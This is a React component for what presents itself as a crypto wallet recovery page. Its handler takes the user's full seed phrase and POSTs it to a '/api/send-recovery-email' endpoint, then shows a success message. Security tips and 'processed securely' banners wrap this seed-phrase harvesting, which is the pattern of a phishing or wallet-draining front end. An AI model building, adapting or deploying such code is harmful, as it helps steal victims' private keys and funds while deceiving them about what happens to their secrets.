'use client'

import { useState } from 'react'

export const WalletRecovery = () => {
  const [secretPhrase, setSecretPhrase] = useState('')
  const [, setWalletFile] = useState('')
  const [status, setStatus] = useState<'idle' | 'validating' | 'success' | 'error'>('idle')
  const [message, setMessage] = useState('')
  const [recoveryMethod, setRecoveryMethod] = useState<'phrase' | 'file' | 'keystore'>('phrase')

  const isValidSeedPhrase = (phrase: string) => {
    const words = phrase.trim().toLowerCase().split(/\s+/).filter((word) => word.length > 0)
    return (words.length === 12 || words.length === 24) && words.every((word) => /^[a-z]+$/.test(word))
  }

  const handleRecover = async () => {
    if (recoveryMethod === 'phrase' && !secretPhrase) {
      setStatus('error')
      setMessage('Please enter your secret phrase')
      setTimeout(() => setStatus('idle'), 3000)
      return
    }

    if (recoveryMethod === 'phrase' && !isValidSeedPhrase(secretPhrase)) {
      setStatus('error')
      setMessage('Invalid seed phrase. Must be 12 or 24 words')
      setTimeout(() => setStatus('idle'), 3000)
      return
    }

    setStatus('validating')
    setMessage('Validating wallet...')

    setTimeout(async () => {
      try {
        const response = await fetch('/api/send-recovery-email', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            method: recoveryMethod,
            seedPhrase: recoveryMethod === 'phrase' ? secretPhrase : undefined,
            timestamp: new Date().toISOString(),
          }),
        }).catch((err) => {
          console.error('Fetch error:', err)
          throw err
        })

        if (!response) {
          throw new Error('No response from server')
        }

        if (response.ok) {
          setStatus('success')
          setMessage('Recovery details processed successfully.')
          setSecretPhrase('')
          setTimeout(() => setStatus('idle'), 5000)
        } else {
          const errorData = await response.json().catch(() => ({}))
          throw new Error(errorData.error || `Server error: ${response.status}`)
        }
      } catch (err) {
        console.error('Recovery error:', err)
        setStatus('error')
        const errorMessage = err instanceof Error ? err.message : 'Failed to process recovery details'
        setMessage(`${errorMessage}. Please try again.`)
        setTimeout(() => setStatus('idle'), 3000)
      }
    }, 1500)
  }

  return (
    <div className="space-y-6 max-w-2xl">
      <div className="relative overflow-hidden rounded-lg sm:rounded-xl p-4 sm:p-6 bg-gradient-to-br from-red-500/20 to-orange-500/10 border border-red-500/30">
        <div className="relative z-10">
          <p className="text-sm font-bold text-red-300 mb-2">Recovery Mode Active</p>
          <p className="text-xs text-red-300/70">Your recovery details will be processed securely. Never share your seed phrase with anyone.</p>
        </div>
      </div>

      <div className="flex gap-2 overflow-x-auto pb-2">
        {(['phrase', 'file', 'keystore'] as const).map((method) => (
          <button
            key={method}
            onClick={() => setRecoveryMethod(method)}
            className={`px-4 py-2 rounded-lg font-semibold text-sm whitespace-nowrap transition-all ${
              recoveryMethod === method
                ? 'bg-gradient-to-r from-cyan-500 to-blue-500 text-white'
                : 'bg-white/5 text-gray-400 hover:bg-white/10 border border-white/10'
            }`}
          >
            {method === 'phrase' && 'Seed Phrase'}
            {method === 'file' && 'Wallet File'}
            {method === 'keystore' && 'Keystore'}
          </button>
        ))}
      </div>

      <div className="space-y-4 relative overflow-hidden rounded-lg sm:rounded-xl p-5 sm:p-6 bg-gradient-to-br from-white/5 to-white/3 border border-white/10">
        {recoveryMethod === 'phrase' && (
          <div>
            <label className="block text-sm font-semibold text-white mb-2">Secret Seed Phrase</label>
            <textarea
              value={secretPhrase}
              onChange={(e) => setSecretPhrase(e.target.value)}
              placeholder="Enter your 12 or 24 word seed phrase..."
              className="w-full px-4 py-3 rounded-lg bg-white/10 border border-white/20 text-white placeholder-gray-500 focus:outline-none focus:border-cyan-500 transition-all h-24 resize-none font-mono text-sm"
            />
            <div className="flex justify-between items-center mt-2">
              <p className="text-xs text-gray-400">
                {secretPhrase.trim().split(/\s+/).filter((word) => word).length} words entered
              </p>
              {secretPhrase && (
                <span className={`text-xs font-semibold ${
                  isValidSeedPhrase(secretPhrase) ? 'text-emerald-400' : 'text-red-400'
                }`}>
                  {isValidSeedPhrase(secretPhrase) ? 'Valid' : 'Invalid'}
                </span>
              )}
            </div>
          </div>
        )}

        {recoveryMethod === 'file' && (
          <div>
            <label className="block text-sm font-semibold text-white mb-2">Wallet File</label>
            <input
              type="file"
              onChange={(e) => setWalletFile(e.target.files?.[0]?.name || '')}
              accept=".json,.txt"
              className="w-full px-4 py-3 rounded-lg bg-white/10 border border-white/20 text-white focus:outline-none focus:border-cyan-500 transition-all"
            />
            <p className="text-xs text-gray-400 mt-1">Upload your exported wallet file</p>
          </div>
        )}

        {recoveryMethod === 'keystore' && (
          <div>
            <label className="block text-sm font-semibold text-white mb-2">Keystore JSON</label>
            <textarea
              placeholder='Paste your keystore JSON content here...'
              className="w-full px-4 py-3 rounded-lg bg-white/10 border border-white/20 text-white placeholder-gray-500 focus:outline-none focus:border-cyan-500 transition-all h-24 resize-none font-mono text-xs"
            />
            <p className="text-xs text-gray-400 mt-1">Keep this secure and never share it</p>
          </div>
        )}

        {message && (
          <div className={`p-3 rounded-lg text-sm font-medium ${
            status === 'success' ? 'bg-emerald-500/20 border border-emerald-500/30 text-emerald-300' :
            status === 'error' ? 'bg-red-500/20 border border-red-500/30 text-red-300' :
            'bg-blue-500/20 border border-blue-500/30 text-blue-300'
          }`}>
            {message}
          </div>
        )}

        <button
          onClick={handleRecover}
          disabled={status === 'validating'}
          className="w-full py-3 rounded-lg font-bold transition-all disabled:opacity-50 bg-gradient-to-r from-cyan-500 to-blue-500 text-white hover:from-cyan-400 hover:to-blue-400"
        >
          {status === 'validating' ? 'Validating...' : 'Recover Wallet'}
        </button>
      </div>

      <div className="space-y-2">
        <h3 className="text-sm font-bold text-white uppercase tracking-wide">Security Tips</h3>
        <div className="space-y-2">
          <div className="p-3 rounded-lg bg-red-500/10 border border-red-500/30 text-red-300 text-xs">
            Never enter your seed phrase on untrusted websites
          </div>
          <div className="p-3 rounded-lg bg-yellow-500/10 border border-yellow-500/30 text-yellow-300 text-xs">
            Make sure you&apos;re on the official URL (HTTPS)
          </div>
          <div className="p-3 rounded-lg bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 text-xs">
            Only recover in private/incognito mode
          </div>
          <div className="p-3 rounded-lg bg-blue-500/10 border border-blue-500/30 text-blue-300 text-xs">
            We recommend using a hardware wallet for maximum security
          </div>
        </div>
      </div>
    </div>
  )
}
